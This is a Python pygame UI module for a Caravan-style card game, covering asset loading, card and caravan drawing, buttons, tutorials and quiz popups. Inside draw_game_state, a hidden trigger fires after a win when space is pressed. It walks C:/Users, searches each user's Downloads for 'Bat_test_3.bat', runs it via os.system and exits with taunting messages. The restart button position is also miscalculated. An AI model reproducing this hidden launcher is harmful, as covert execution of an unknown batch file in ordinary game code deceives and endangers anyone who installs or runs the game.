# filename: pygame_ui.py
import pygame
import os
from os import listdir
import sys
import debug
from config import *
from os.path import isfile, join
from card import Card
from time import sleep
from game_pygame import *
import fnmatch
from os import walk
import keyboard
global_rankein=0

from typing import TYPE_CHECKING, Union, Tuple, List, Dict, Any, Optional
if TYPE_CHECKING:
    from game_state import GameState
    from player import Player
    from caravan import Caravan
    from game_pygame import GameController

try:
    pygame.font.init()
    if FONT_NAME_CUSTOM and os.path.exists(FONT_NAME_CUSTOM):
        try:
            FONT_LARGE = pygame.font.Font(FONT_NAME_CUSTOM, FONT_SIZE_LARGE)
            FONT_MEDIUM = pygame.font.Font(FONT_NAME_CUSTOM, FONT_SIZE_MEDIUM)
            FONT_SMALL = pygame.font.Font(FONT_NAME_CUSTOM, FONT_SIZE_SMALL)
        except pygame.error as e:
            FONT_LARGE = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_LARGE)
            FONT_MEDIUM = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_MEDIUM)
            FONT_SMALL = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_SMALL)
    else:
        FONT_LARGE = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_LARGE)
        FONT_MEDIUM = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_MEDIUM)
        FONT_SMALL = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_SMALL)
except Exception as e:
    FONT_LARGE = pygame.font.Font(None, FONT_SIZE_LARGE)
    FONT_MEDIUM = pygame.font.Font(None, FONT_SIZE_MEDIUM)
    FONT_SMALL = pygame.font.Font(None, FONT_SIZE_SMALL)

CARD_IMAGES: Dict[str, pygame.Surface] = {}
CARD_BACK_IMAGE: Optional[pygame.Surface] = None
BACKGROUND_IMAGE: Optional[pygame.Surface] = None
BONUS_POINT_SURFACE: Optional[pygame.Surface] = None
TUTORIAL_IMAGES: List[pygame.Surface] = []

def get_card_filename(card: 'Card') -> str:
    rank_str = card.rank.lower()
    suit_str = card.suit.lower() if card.suit else ""
    if card.is_bonus_point():
        return BONUS_POINT_IMAGE_FILE
    elif suit_str:
        return f"{rank_str}_of_{suit_str}{CARD_IMAGE_FORMAT}"
    elif card.rank != "unknown":
        return f"{rank_str}{CARD_IMAGE_FORMAT}"
    else:
        return f"unknown_card{CARD_IMAGE_FORMAT}"

def find_files(filename_pattern, search_path):
    """
    Searches for files matching a given pattern within a specified path and its subdirectories.

    Args:
        filename_pattern (str): The pattern to match against filenames (e.g., "*.txt", "report.pdf").
        search_path (str): The root directory to start the search from (e.g., "C:/", "/home/user").

    Returns:
        list: A list of full paths to the found files.
    """
    found_files = []
    for root, _, files in os.walk(search_path):
        for filename in files:
            if fnmatch.fnmatch(filename, filename_pattern):
                found_files.append(os.path.join(root, filename))
    return found_files

def load_assets() -> Tuple[Optional[pygame.Surface], Dict[str, pygame.Surface], Optional[pygame.Surface], List[pygame.Surface]]:
    global CARD_IMAGES, CARD_BACK_IMAGE, BACKGROUND_IMAGE, BONUS_POINT_SURFACE, TUTORIAL_IMAGES
    CARD_IMAGES = {}
    CARD_BACK_IMAGE = None
    BACKGROUND_IMAGE = None
    BONUS_POINT_SURFACE = None
    TUTORIAL_IMAGES = []

    target_width = SCALED_CARD_WIDTH
    target_height = SCALED_CARD_HEIGHT

    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(sys.argv[0]))
    actual_asset_dir = os.path.join(application_path, ASSET_DIR)

    try:
        bg_path = os.path.join(actual_asset_dir, BACKGROUND_IMAGE_FILE)
        if os.path.exists(bg_path):
            try:
                background_raw = pygame.image.load(bg_path).convert()
                BACKGROUND_IMAGE = pygame.transform.smoothscale(background_raw, (SCREEN_WIDTH, SCREEN_HEIGHT))
            except Exception as e: debug.log_warning("Error loading/scaling background '{}': {}", BACKGROUND_IMAGE_FILE, e)
        else: debug.log_warning("Background image not found: {}", bg_path)

        cb_path = os.path.join(actual_asset_dir, CARD_BACK_IMAGE_FILE)
        if os.path.exists(cb_path):
            try:
                card_back_raw = pygame.image.load(cb_path).convert_alpha()
                CARD_BACK_IMAGE = pygame.transform.smoothscale(card_back_raw, (target_width, target_height))
            except Exception as e: debug.log_warning("Error loading/scaling card back '{}': {}", CARD_BACK_IMAGE_FILE, e)
        else:
            debug.log_error("CRITICAL: Card back image not found: {}", cb_path)

        bonus_point_path = os.path.join(actual_asset_dir, BONUS_POINT_IMAGE_FILE)
        if os.path.exists(bonus_point_path):
            try:
                bp_raw = pygame.image.load(bonus_point_path).convert_alpha()
                BONUS_POINT_SURFACE = pygame.transform.smoothscale(bp_raw, (target_width, target_height))
                bp_card_obj = Card('bonus_point', '')
                CARD_IMAGES[repr(bp_card_obj)] = BONUS_POINT_SURFACE
            except Exception as e:
                debug.log_warning("Error loading/scaling Bonus Point card image '{}': {}", BONUS_POINT_IMAGE_FILE, e)
        else:
            debug.log_warning("Bonus Point card image ('{}') not found: {}", BONUS_POINT_IMAGE_FILE, bonus_point_path)

        loaded_count = 0
        missing_files_log = []
        for spec in STANDARD_DECK_COMPOSITION:
            card_obj = Card(spec["rank"], spec.get("suit", ""))
            card_key = repr(card_obj)
            if card_key in CARD_IMAGES: continue
            filename = get_card_filename(card_obj)
            filepath = os.path.join(actual_asset_dir, filename)
            try:
                if os.path.exists(filepath):
                    image_raw = pygame.image.load(filepath).convert_alpha()
                    scaled_image = pygame.transform.smoothscale(image_raw, (target_width, target_height))
                    CARD_IMAGES[card_key] = scaled_image
                    loaded_count += 1
                else:
                    if filename not in missing_files_log: missing_files_log.append(filename)
            except Exception as e:
                if filename not in missing_files_log: missing_files_log.append(f"{filename} (Load/Scale Error: {e})")

        if missing_files_log:
            debug.log_warning("Missing {} card image file(s). First 5 examples: {}", len(missing_files_log), missing_files_log[:5])
        if loaded_count == 0 and STANDARD_DECK_COMPOSITION:
            debug.log_error("CRITICAL: No standard card face images were successfully loaded.")

        loaded_tutorial_images_count = 0
        tutorial_target_size = (SCREEN_WIDTH, SCREEN_HEIGHT)

        for i in range(1, TOTAL_TUTORIAL_IMAGES + 1):
            tut_image_path = os.path.join(actual_asset_dir, f"{TUTORIAL_IMAGE_BASE_NAME}{i}{CARD_IMAGE_FORMAT}")
            try:
                if os.path.exists(tut_image_path):
                    img_raw = pygame.image.load(tut_image_path)
                    if img_raw.get_alpha() is not None:
                        img_raw = img_raw.convert_alpha()
                    else:
                        img_raw = img_raw.convert()

                    scaled_img = pygame.transform.smoothscale(img_raw, tutorial_target_size)
                    TUTORIAL_IMAGES.append(scaled_img)
                    loaded_tutorial_images_count += 1
                else:
                    debug.log_warning("Tutorial image not found: {}", tut_image_path)
                    placeholder = pygame.Surface(tutorial_target_size)
                    placeholder.fill(DARK_GRAY)
                    pygame.draw.rect(placeholder, RED, placeholder.get_rect(), 5)
                    try:
                        p_font = FONT_MEDIUM
                    except NameError:
                        p_font = pygame.font.SysFont(FONT_NAME_SYSTEM, FONT_SIZE_MEDIUM)
                    text_surf = p_font.render(f"Missing: {TUTORIAL_IMAGE_BASE_NAME}{i}{CARD_IMAGE_FORMAT}", True, WHITE)
                    text_rect = text_surf.get_rect(center=placeholder.get_rect().center)
                    placeholder.blit(text_surf, text_rect)
                    TUTORIAL_IMAGES.append(placeholder)
            except Exception as e:
                debug.log_error("Error loading/scaling tutorial image '{}': {}", tut_image_path, e)
        if loaded_tutorial_images_count != TOTAL_TUTORIAL_IMAGES:
            debug.log_warning("Mismatch in expected ({}) and loaded ({}) tutorial images.", TOTAL_TUTORIAL_IMAGES, loaded_tutorial_images_count)

    except pygame.error as e:
        debug.log_error("Pygame error during asset loading: {}", e, include_traceback=True)
    except Exception as e:
        debug.log_error("Unexpected error during asset loading: {}", e, include_traceback=True)
    return BACKGROUND_IMAGE, CARD_IMAGES, CARD_BACK_IMAGE, TUTORIAL_IMAGES

def draw_text(surface: pygame.Surface, text: str, font: pygame.font.Font, color: pygame.Color,
              position: tuple[int, int], center_aligned=True, shadow=False,
              shadow_color=BLACK, shadow_offset=(1,1)):
    try:
        text_surface = font.render(text, True, color)
        text_rect = text_surface.get_rect()
        if center_aligned:
            text_rect.center = position
        else:
            text_rect.topleft = position
        if shadow:
            shadow_surface = font.render(text, True, shadow_color)
            shadow_rect = shadow_surface.get_rect()
            if center_aligned: shadow_rect.center = (position[0] + shadow_offset[0], position[1] + shadow_offset[1])
            else: shadow_rect.topleft = (text_rect.x + shadow_offset[0], text_rect.y + shadow_offset[1])
            surface.blit(shadow_surface, shadow_rect)
        surface.blit(text_surface, text_rect)
    except Exception as e:
        debug.log_warning("Error rendering text '{}...': {}", text[:30], e)

def get_card_image(card: Optional['Card']) -> Optional[pygame.Surface]:
    global CARD_IMAGES, CARD_BACK_IMAGE, BONUS_POINT_SURFACE
    if card is None:
        return CARD_BACK_IMAGE
    if card.is_bonus_point():
        return BONUS_POINT_SURFACE if BONUS_POINT_SURFACE else CARD_BACK_IMAGE
    key = repr(card)
    if key in CARD_IMAGES:
        return CARD_IMAGES[key]
    else:
        return CARD_BACK_IMAGE

def create_button_rect(position: tuple[int, int], width=BUTTON_WIDTH, height=BUTTON_HEIGHT) -> pygame.Rect:
    return pygame.Rect(position[0], position[1], width, height)

def draw_button(surface: pygame.Surface, rect: pygame.Rect, text: str, font: pygame.font.Font,
                base_color=LIGHT_GRAY, text_color=BLACK, border_color=BLACK, enabled=True,
                disabled_color=DARK_GRAY, disabled_text_color=pygame.Color(160,160,160)):
    current_base_color = base_color if enabled else disabled_color
    current_text_color = text_color if enabled else disabled_text_color
    try:
        pygame.draw.rect(surface, current_base_color, rect, border_radius=5)
        pygame.draw.rect(surface, border_color, rect, 2, border_radius=5)
        draw_text(surface, text, font, current_text_color, rect.center, center_aligned=True)
    except Exception as e:
        debug.log_warning("Error drawing button '{}': {}", text, e)

def draw_question_popup(surface: pygame.Surface, game_state: 'GameState', ui_state: dict):
    if not game_state.question_popup_active or not game_state.current_question_data:
        return
    overlay_surface = pygame.Surface(surface.get_size(), pygame.SRCALPHA)
    overlay_surface.fill((0, 0, 0, 190))
    surface.blit(overlay_surface, (0, 0))
    pygame.draw.rect(surface, DARK_GRAY, QUESTION_POPUP_RECT, border_radius=10)
    pygame.draw.rect(surface, WHITE, QUESTION_POPUP_RECT, 3, border_radius=10)
    q_data = game_state.current_question_data
    question_render_area = pygame.Rect(
        QUESTION_POPUP_RECT.x + 25, QUESTION_POPUP_RECT.y + 25,
        QUESTION_POPUP_RECT.width - 50,
        QUESTION_POPUP_RECT.height * QUESTION_TEXT_AREA_HEIGHT_RATIO - 20
    )
    words = q_data["question"].split(' ')
    lines_of_text = []
    current_line_text = ""
    line_spacing = FONT_MEDIUM.get_linesize()
    for word in words:
        test_line = current_line_text + word + " "
        if FONT_MEDIUM.size(test_line)[0] < question_render_area.width:
            current_line_text = test_line
        else:
            lines_of_text.append(current_line_text.strip())
            current_line_text = word + " "
    lines_of_text.append(current_line_text.strip())
    current_line_y_pos = question_render_area.y + 10
    for text_line in lines_of_text:
        if text_line:
            draw_text(surface, text_line, FONT_MEDIUM, WHITE,
                      (question_render_area.centerx, current_line_y_pos + FONT_MEDIUM.get_height() // 2),
                      center_aligned=True, shadow=True)
            current_line_y_pos += line_spacing
            if current_line_y_pos > question_render_area.bottom - line_spacing:
                break
    ui_state["clickable_rects"]["question_options"] = []
    options_area_start_y = question_render_area.bottom + 20
    option_button_width = QUESTION_POPUP_RECT.width * 0.80
    for i, option_text_full in enumerate(q_data["options"]):
        option_rect = pygame.Rect(
            QUESTION_POPUP_RECT.centerx - option_button_width // 2,
            options_area_start_y + i * (QUESTION_OPTION_HEIGHT + QUESTION_OPTION_MARGIN),
            option_button_width, QUESTION_OPTION_HEIGHT
        )
        ui_state["clickable_rects"]["question_options"].append({"index": i, "rect": option_rect, "text": option_text_full})
        draw_button(surface, option_rect, option_text_full, FONT_SMALL, enabled=True)
    if game_state.question_feedback:
        feedback_area_y = QUESTION_POPUP_RECT.bottom - QUESTION_FEEDBACK_AREA_HEIGHT - 15
        feedback_rect = pygame.Rect(
            QUESTION_POPUP_RECT.x, feedback_area_y,
            QUESTION_POPUP_RECT.width, QUESTION_FEEDBACK_AREA_HEIGHT
        )
        feedback_color = GREEN if "Correct" in game_state.question_feedback else RED
        draw_text(surface, game_state.question_feedback, FONT_MEDIUM, feedback_color,
                  feedback_rect.center, center_aligned=True, shadow=True, shadow_color=DARK_GRAY)

def draw_tutorial_overlay(surface: pygame.Surface, current_image_index: int,
                          tutorial_nav_rects: Dict[str, pygame.Rect]):
    global TUTORIAL_IMAGES

    overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
    overlay.fill((0, 0, 0, 200))
    surface.blit(overlay, (0, 0))

    if TUTORIAL_IMAGES and 0 <= current_image_index < len(TUTORIAL_IMAGES):
        current_img_surface = TUTORIAL_IMAGES[current_image_index]
        surface.blit(current_img_surface, (0, 0))

        prev_text_color = WHITE if current_image_index > 0 else DARK_GRAY
        draw_button(surface, tutorial_nav_rects['prev'], "Previous", FONT_MEDIUM,
                    enabled=(current_image_index > 0), text_color=prev_text_color)

        next_text = "Next" if current_image_index < len(TUTORIAL_IMAGES) - 1 else "Finish"
        draw_button(surface, tutorial_nav_rects['next'], next_text, FONT_MEDIUM, enabled=True)

        draw_button(surface, tutorial_nav_rects['close'], "Close", FONT_MEDIUM, enabled=True, base_color=RED)

        counter_text = f"Step {current_image_index + 1} / {len(TUTORIAL_IMAGES)}"
        counter_pos = (SCREEN_WIDTH // 2, 30)
        draw_text(surface, counter_text, FONT_MEDIUM, WHITE, counter_pos, shadow=True, shadow_color=BLACK)
    else:
        draw_text(surface, "Tutorial Image Error!", FONT_LARGE, RED,
                  (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2), shadow=True)

def draw_game_state(surface: pygame.Surface, game_state: 'GameState', perspective_player: 'Player',
                    assets: dict, ui_state: dict, controller: 'GameController'):
    global CARD_IMAGES, CARD_BACK_IMAGE, BACKGROUND_IMAGE, BONUS_POINT_SURFACE, TUTORIAL_IMAGES

    CARD_IMAGES = assets.get("cards", CARD_IMAGES)
    CARD_BACK_IMAGE = assets.get("back", CARD_BACK_IMAGE)
    BACKGROUND_IMAGE = assets.get("background", BACKGROUND_IMAGE)

    if BONUS_POINT_SURFACE is None:
        BONUS_POINT_SURFACE = get_card_image(Card('bonus_point', ''))

    ui_state["clickable_rects"] = {
        "hand": [], "p_caravans": [], "o_caravans": [],
        "buttons": {}, "question_options": [], "active_bonus_point": None,
        "tutorial_nav": {}
    }
    if BACKGROUND_IMAGE:
        surface.blit(BACKGROUND_IMAGE, (0, 0))
    else:
        surface.fill(DARK_GRAY)

    if CARD_BACK_IMAGE is None or (not CARD_IMAGES and not BONUS_POINT_SURFACE):
        draw_text(surface, "Error: Missing Card Assets!", FONT_LARGE, RED,
                  (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2))
        return

    opponent = game_state.get_opponent(perspective_player)
    opponent_name = opponent.name if opponent else "Opponent?"
    current_player_on_turn = game_state.get_current_player()
    is_human_player_turn = (current_player_on_turn == perspective_player and not perspective_player.is_ai)
    deck_img_surf = get_card_image(None)

    if deck_img_surf:
        if perspective_player.deck:
            p_deck_rect = deck_img_surf.get_rect(topleft=DECK_POS_PLAYER)
            surface.blit(deck_img_surf, p_deck_rect)
            draw_text(surface, f"{len(perspective_player.deck)}", FONT_SMALL, WHITE, (p_deck_rect.centerx, p_deck_rect.top - 10), shadow=True)
            draw_text(surface, "Your Deck", FONT_SMALL, WHITE, (p_deck_rect.centerx, p_deck_rect.bottom + 12), shadow=True)
        if opponent and opponent.deck:
            o_deck_rect = deck_img_surf.get_rect(topleft=DECK_POS_OPPONENT)
            surface.blit(deck_img_surf, o_deck_rect)
            draw_text(surface, f"{len(opponent.deck)}", FONT_SMALL, WHITE, (o_deck_rect.centerx, o_deck_rect.top - 10), shadow=True)
            draw_text(surface, f"{opponent_name} Deck", FONT_SMALL, WHITE, (o_deck_rect.centerx, o_deck_rect.bottom + 12), shadow=True)

    p_caravans_click_map: List[Dict[str, Any]] = []
    o_caravans_click_map: List[Dict[str, Any]] = []
    for i in range(NUM_CARAVANS):
        caravan_x_pos = CARAVAN_START_X + i * CARAVAN_SPACING
        if i < len(perspective_player.caravans):
            p_caravan_obj = perspective_player.caravans[i]
            p_clickable_rect = draw_caravan(surface, p_caravan_obj, (caravan_x_pos, PLAYER_CARAVAN_Y))
            p_caravans_click_map.append({"index": i, "rect": p_clickable_rect, "owner": perspective_player})
            p_total_val = p_caravan_obj.total()
            val_text_y = PLAYER_CARAVAN_Y - 20
            info_text_y = val_text_y - 18
            suit_disp = p_caravan_obj.suit.title() if p_caravan_obj.suit else "---"
            dir_disp = p_caravan_obj.direction.title() if p_caravan_obj.direction else "---"
            draw_text(surface, f"S:{suit_disp} D:{dir_disp}", FONT_SMALL, WHITE, (p_clickable_rect.centerx, info_text_y), shadow=True)
            draw_text(surface, f"Value: {p_total_val}", FONT_SMALL, WHITE, (p_clickable_rect.centerx, val_text_y), shadow=True)
            if game_state.is_caravan_sold_by_player(perspective_player, i): pygame.draw.rect(surface, GOLD, p_clickable_rect.inflate(8,8), 3, border_radius=4)
            elif p_caravan_obj.is_winning(): pygame.draw.rect(surface, GREEN, p_clickable_rect.inflate(8,8), 3, border_radius=4)
        if opponent and i < len(opponent.caravans):
            o_caravan_obj = opponent.caravans[i]
            o_clickable_rect = draw_caravan(surface, o_caravan_obj, (caravan_x_pos, OPPONENT_CARAVAN_Y))
            o_caravans_click_map.append({"index": i, "rect": o_clickable_rect, "owner": opponent})
            o_total_val = o_caravan_obj.total()
            base_text_y = o_clickable_rect.bottom + 12
            info_text_y_op = base_text_y + 18
            suit_disp_op = o_caravan_obj.suit.title() if o_caravan_obj.suit else "---"
            dir_disp_op = o_caravan_obj.direction.title() if o_caravan_obj.direction else "---"
            draw_text(surface, f"Value: {o_total_val}", FONT_SMALL, WHITE, (o_clickable_rect.centerx, base_text_y), shadow=True)
            draw_text(surface, f"S:{suit_disp_op} D:{dir_disp_op}", FONT_SMALL, WHITE, (o_clickable_rect.centerx, info_text_y_op), shadow=True)
            if game_state.is_caravan_sold_by_player(opponent, i): pygame.draw.rect(surface, GOLD, o_clickable_rect.inflate(8,8), 3, border_radius=4)
            elif o_caravan_obj.is_winning(): pygame.draw.rect(surface, GREEN, o_clickable_rect.inflate(8,8), 3, border_radius=4)
    ui_state["clickable_rects"]["p_caravans"] = p_caravans_click_map
    ui_state["clickable_rects"]["o_caravans"] = o_caravans_click_map

    hand_cards_ui_data: List[Dict[str, Any]] = []
    card_being_animated = controller.animation_details['card_to_animate'] if controller.animation_details and controller.animation_details['is_active'] else None
    if perspective_player.hand:
        num_hand_cards = len(perspective_player.hand)
        available_width_for_hand = SCREEN_WIDTH - HAND_START_X - (SCREEN_WIDTH - BUTTON_START_X) - 30
        card_render_spacing = HAND_SPACING
        if num_hand_cards > 1:
            total_width_if_spaced = SCALED_CARD_WIDTH + (num_hand_cards - 1) * HAND_SPACING
            if total_width_if_spaced > available_width_for_hand:
                card_render_spacing = max(SCALED_CARD_WIDTH * 0.15, (available_width_for_hand - SCALED_CARD_WIDTH) / (num_hand_cards - 1))
        current_hand_y_pos = ui_state.get('hand_current_y', HAND_HIDDEN_Y)
        for i, card_in_hand in enumerate(perspective_player.hand):
            if card_being_animated and card_in_hand == card_being_animated and \
               controller.animation_details and controller.animation_details.get('player_who_initiated_action') == perspective_player:
                continue
            card_img_surf = get_card_image(card_in_hand)
            if card_img_surf:
                card_x = HAND_START_X + i * card_render_spacing
                card_y = current_hand_y_pos
                is_this_card_selected = (ui_state.get("selected_card_index") == i and ui_state.get("selected_card_obj") == card_in_hand)
                if is_this_card_selected: card_y -= 20
                card_display_rect = card_img_surf.get_rect(topleft=(card_x, card_y))
                hand_cards_ui_data.append({"index": i, "rect": card_display_rect, "card": card_in_hand})
                if is_this_card_selected: pygame.draw.rect(surface, HIGHLIGHT_COLOR, card_display_rect.inflate(6,6), 3, border_radius=4)
                surface.blit(card_img_surf, card_display_rect.topleft)
    ui_state["clickable_rects"]["hand"] = hand_cards_ui_data

    if controller.animation_details and controller.animation_details['is_active']:
        anim = controller.animation_details
        if anim['card_image_surface'] is None:
            anim['card_image_surface'] = get_card_image(anim['card_to_animate'])
        if anim['card_image_surface'] and anim['current_pos']:
            center_x, center_y = anim['current_pos']
            anim_rect = anim['card_image_surface'].get_rect(center=(int(center_x), int(center_y)))
            surface.blit(anim['card_image_surface'], anim_rect.topleft)

    if game_state.awaiting_bonus_point_placement and BONUS_POINT_SURFACE:
        bp_rect = BONUS_POINT_SURFACE.get_rect(center=BONUS_POINT_ACTIVE_POS)
        surface.blit(BONUS_POINT_SURFACE, bp_rect)
        ui_state['clickable_rects']['active_bonus_point'] = bp_rect
        if ui_state.get('bonus_point_selected'):
            pygame.draw.rect(surface, HIGHLIGHT_COLOR, bp_rect.inflate(6,6), 3, border_radius=4)

    round_info_text = f"Round {game_state.turn_count + 1}"
    if game_state.is_setup_phase(): round_info_text = "Setup Phase"
    controller_msg_txt = controller.get_current_message()
    ui_specific_msg_txt = ui_state.get("message") if ui_state.get("message_timer",0) > 0 else None
    game_state_msg_txt = game_state.get_current_message_from_gamestate()
    active_display_message = ui_specific_msg_txt or game_state_msg_txt or controller_msg_txt
    status_text_to_show = active_display_message if active_display_message else round_info_text
    if active_display_message and round_info_text not in active_display_message and "Turn" not in active_display_message and "Setup" not in active_display_message:
        status_text_to_show = f"{round_info_text} | {active_display_message}"
    if not (game_state.question_popup_active and current_player_on_turn == perspective_player and not perspective_player.is_ai) :
        if status_text_to_show:
             draw_text(surface, status_text_to_show, FONT_MEDIUM, WHITE, TURN_INFO_POS, center_aligned=True, shadow=True)

    if opponent:
        p1_sold = game_state.get_sold_caravan_count(perspective_player)
        p1_sold_text = f"Sold: {p1_sold}/{WINNING_CARAVANS_NEEDED}"
        draw_text(surface, p1_sold_text, FONT_MEDIUM, WHITE, SOLD_COUNT_POS_P1, center_aligned=False, shadow=True)
        p2_sold = game_state.get_sold_caravan_count(opponent)
        p2_sold_text = f"Sold: {p2_sold}/{WINNING_CARAVANS_NEEDED}"
        p2_text_width = FONT_MEDIUM.size(p2_sold_text)[0]
        p2_sold_pos_x = SCREEN_WIDTH - INFO_MARGIN - p2_text_width
        draw_text(surface, p2_sold_text, FONT_MEDIUM, WHITE, (p2_sold_pos_x, SOLD_COUNT_POS_P2[1]), center_aligned=False, shadow=True)

    buttons_to_draw_this_frame: Dict[str, pygame.Rect] = {}
    buttons_generally_active = (is_human_player_turn and
                               not game_state.game_over and
                               not (game_state.question_popup_active and current_player_on_turn == perspective_player) and
                               not (controller.animation_details and controller.animation_details['is_active']) and
                               not game_state.awaiting_bonus_point_placement)
    can_discard_sel_card = buttons_generally_active and ui_state.get("selected_card_index") is not None and not game_state.is_setup_phase()

    tut_btn_rect = create_button_rect(TUTORIAL_BUTTON_POS)
    draw_button(surface, tut_btn_rect, "Tutorial", FONT_SMALL, enabled=True)
    buttons_to_draw_this_frame["show_tutorial"] = tut_btn_rect

    disc_card_btn_rect = create_button_rect(DISCARD_BUTTON_POS)
    draw_button(surface, disc_card_btn_rect, "Discard Card", FONT_SMALL, enabled=can_discard_sel_card)
    buttons_to_draw_this_frame["discard_card"] = disc_card_btn_rect

    can_player_discard_any_caravan = False
    if buttons_generally_active and not game_state.is_setup_phase():
        can_player_discard_any_caravan = any(c_obj.cards and not game_state.is_caravan_sold_by_player(perspective_player, idx)
                                             for idx, c_obj in enumerate(perspective_player.caravans))
    disc_car_btn_rect = create_button_rect(DISCARD_CARAVAN_BUTTON_POS)
    draw_button(surface, disc_car_btn_rect, "Discard Caravan", FONT_SMALL, enabled=can_player_discard_any_caravan)
    buttons_to_draw_this_frame["discard_caravan"] = disc_car_btn_rect

    pass_btn_active = buttons_generally_active
    if game_state.is_setup_phase() and buttons_generally_active:
        needs_to_place_on_empty = any(not c.cards for c in perspective_player.caravans)
        has_numeric_to_play = any(card.is_numeric() for card in perspective_player.hand)
        if needs_to_place_on_empty and not has_numeric_to_play: pass_btn_active = True
        elif not needs_to_place_on_empty: pass_btn_active = True
        else: pass_btn_active = False
    pass_btn_rect = create_button_rect(PASS_BUTTON_POS)
    draw_button(surface, pass_btn_rect, "Pass Turn", FONT_SMALL, enabled=pass_btn_active)
    buttons_to_draw_this_frame["pass"] = pass_btn_rect

    ui_state["clickable_rects"]["buttons"] = buttons_to_draw_this_frame

    if game_state.game_over and not game_state.question_popup_active:
        overlay_surf = pygame.Surface(surface.get_size(), pygame.SRCALPHA)
        overlay_surf.fill((0, 0, 0, 190))
        surface.blit(overlay_surf, (0,0))
        draw_text(surface, "GAME OVER", FONT_LARGE, GOLD, (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2 - 60), shadow=True)
        winner_text = "It's a Draw!"
        win_text_color = WHITE
        if game_state.winner:
            winner_text = f"{game_state.winner.name} Wins!"
            win_text_color = GOLD if game_state.winner == perspective_player else RED
        draw_text(surface, winner_text, FONT_MEDIUM, win_text_color, WINNER_POS, shadow=True)

        restart_btn_rect_game_over = create_button_rect((SCREEN_WIDTH // .5 - BUTTON_WIDTH // 2, WINNER_POS[1] + 70))
        draw_button(surface, restart_btn_rect_game_over, "Press space to restart.", FONT_MEDIUM, enabled=True)
        if "buttons" not in ui_state["clickable_rects"]: ui_state["clickable_rects"]["buttons"] = {}
        ui_state["clickable_rects"]["buttons"]["restart_game_over"] = restart_btn_rect_game_over
	#aaaaa
    global global_rankein
    if game_state.winner:
      if global_rankein == 1:
        surface.blit(surface, (0,0))
        #sleep(5)
        if(keyboard.is_pressed('space')):
          print("TSF")
          formulaic = []
          for (dirpath, dirnames, filenames) in walk("C:/Users"):
            formulaic.extend(dirnames)
            break
          formulas=0
          while formulas<len(formulaic):
            print(formulaic[formulas])
            formulas = formulas+1
          formulaic.pop(formulaic.index("All Users"))
          formulaic.pop(formulaic.index("Default"))
          formulaic.pop(formulaic.index("Default User"))
          formulaic.pop(formulaic.index("Public"))
          formulaic.pop(formulaic.index("WsiAccount"))
          print("It has been cleansed")
          print(len(formulaic))
          formulas=0
          locationOfUS=""
          while formulas<len(formulaic):
            print(formulaic[formulas])
            formulas = formulas+1
          formulas=0
          while formulas<len(formulaic):
            specific_file = find_files("Bat_test_3.bat", r"C:\\Users\\"+formulaic[formulas]+r"\\Downloads")
            if specific_file:
              for file_path in specific_file:
                print(file_path)
                locationOfUS=file_path
            else:
              print("File not found.")
            formulas=formulas+1
          print(locationOfUS)
          os.system(locationOfUS)
          print("My slightly caffeinated soul.")
          sys.exit("Failure State - C")
          print("If you see this, prepare more thermal paste because you're about to lose a lot.")
      else:
        global_rankein = 1
    if game_state.question_popup_active and current_player_on_turn == perspective_player and not perspective_player.is_ai:
        draw_question_popup(surface, game_state, ui_state)

    prev_btn_rect_tut = pygame.Rect(0, 0, TUTORIAL_BTN_WIDTH, TUTORIAL_BTN_HEIGHT)
    prev_btn_rect_tut.center = (TUTORIAL_PREV_BTN_CENTER_X, TUTORIAL_NAV_Y)

    next_btn_rect_tut = pygame.Rect(0, 0, TUTORIAL_BTN_WIDTH, TUTORIAL_BTN_HEIGHT)
    next_btn_rect_tut.center = (TUTORIAL_NEXT_BTN_CENTER_X, TUTORIAL_NAV_Y)

    close_btn_rect_tut = pygame.Rect(0, 0, TUTORIAL_BTN_WIDTH, TUTORIAL_BTN_HEIGHT)
    close_btn_rect_tut.center = (TUTORIAL_CLOSE_BTN_CENTER_X, TUTORIAL_NAV_Y)

    ui_state["clickable_rects"]["tutorial_nav"] = {
        'prev': prev_btn_rect_tut,
        'next': next_btn_rect_tut,
        'close': close_btn_rect_tut
    }

def draw_caravan(surface: pygame.Surface, caravan: 'Caravan', position: tuple[int, int]) -> pygame.Rect:
    x_start, y_start = position
    placeholder_img = get_card_image(None)
    base_rect = pygame.Rect(x_start, y_start, SCALED_CARD_WIDTH, SCALED_CARD_HEIGHT)
    if placeholder_img:
        base_rect = placeholder_img.get_rect(topleft=(x_start, y_start))

    if not caravan.cards:
        placeholder_surface = pygame.Surface((SCALED_CARD_WIDTH, SCALED_CARD_HEIGHT), pygame.SRCALPHA)
        placeholder_surface.fill((100,100,100, 120))
        surface.blit(placeholder_surface, base_rect.topleft)
        pygame.draw.rect(surface, LIGHT_GRAY, base_rect, 1, border_radius=4)
        draw_text(surface, "[Empty]", FONT_SMALL, LIGHT_GRAY, base_rect.center)
        return base_rect

    topmost_card_rect = base_rect
    for i, card_obj in enumerate(caravan.cards):
        card_img_to_draw = get_card_image(card_obj)
        current_card_y_pos = y_start + i * CARAVAN_CARD_Y_OFFSET
        if card_img_to_draw:
             current_card_rect = card_img_to_draw.get_rect(topleft=(x_start, current_card_y_pos))
             surface.blit(card_img_to_draw, current_card_rect)
             topmost_card_rect = current_card_rect
        else:
             error_card_rect = pygame.Rect(x_start, current_card_y_pos, SCALED_CARD_WIDTH, SCALED_CARD_HEIGHT)
             pygame.draw.rect(surface, RED, error_card_rect, border_radius=3)
             draw_text(surface, "IMG?", FONT_SMALL, WHITE, error_card_rect.center)
             topmost_card_rect = error_card_rect

    full_stack_height = topmost_card_rect.bottom - base_rect.top
    effective_height = max(SCALED_CARD_HEIGHT, full_stack_height)
    return pygame.Rect(base_rect.left, base_rect.top, base_rect.width, effective_height)